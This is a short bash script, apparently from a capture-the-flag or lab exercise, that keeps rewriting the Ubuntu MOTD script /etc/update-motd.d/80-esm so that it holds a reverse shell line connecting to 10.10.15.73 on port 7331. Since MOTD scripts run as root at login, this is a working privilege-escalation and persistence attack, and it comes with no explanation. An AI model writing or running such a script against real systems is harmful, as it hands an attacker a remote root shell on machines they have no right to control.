#!/bin/bash
while true
do
        echo '#!/bin/bash' > /etc/update-motd.d/80-esm
	echo '/bin/bash -i >& /dev/tcp/10.10.15.73/7331 0>&1' >> /etc/update-motd.d/80-esm
        sleep 0.1;
done


